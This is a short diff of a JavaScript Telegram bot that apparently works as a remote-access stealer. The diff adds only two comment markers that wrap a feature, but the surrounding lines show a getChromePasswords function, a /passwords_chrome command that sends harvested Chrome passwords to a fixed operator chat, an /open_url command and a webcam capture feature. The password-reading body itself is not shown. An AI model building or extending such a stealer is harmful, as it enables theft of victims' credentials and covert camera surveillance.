@@ -221,6 +221,7 @@ bot.onText(/\/open_url (.+)/, async (msg, match) => {
 
 // --- WIP Features ---
 
+// -- START_FEATURE_PASSWORDS --
 async function getChromePasswords() {
     let resultText = '🔑 Chrome Passwords 🔑\n\n';
     try {
@@ -294,6 +295,7 @@ bot.onText(/\/passwords_chrome/, async (msg) => {
         bot.sendMessage(CHAT_ID, `Error getting passwords: ${error.message}`);
     }
 });
+// -- END_FEATURE_PASSWORDS --
 
 // -- START_FEATURE_WEBCAM --
 const NodeWebcam = require( "node-webcam" );
